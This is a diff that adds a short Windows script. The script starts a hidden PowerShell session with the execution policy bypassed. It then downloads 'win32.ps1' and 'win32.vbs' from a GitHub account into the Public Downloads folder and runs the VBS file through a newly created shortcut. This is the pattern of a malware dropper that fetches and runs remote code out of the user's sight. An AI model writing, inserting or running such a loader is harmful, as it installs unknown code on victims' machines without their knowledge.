@@ -1,0 +1,30 @@
+cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
+$LocalPath = "C:\Users\Public\Downloads"
+
+# File URLs
+$File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/win32.ps1"
+$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/win32.vbs"
+
+# File names
+$File1Name = "win32.ps1"
+$File2Name = "win32.vbs"
+
+# Full paths to save the files
+$File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
+$File2Path = Join-Path -Path $LocalPath -ChildPath $File2Name
+
+# Download win32.ps1
+Invoke-WebRequest -Uri $File1Url -OutFile $File1Path
+
+# Download win32.vbs
+Invoke-WebRequest -Uri $File2Url -OutFile $File2Path
+
+# Create a shortcut for win32.vbs
+$ShortcutPath = Join-Path -Path $LocalPath -ChildPath "win32.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $File2Path
+$Shortcut.Save()
+
+# Execute the shortcut
+Start-Process $ShortcutPath
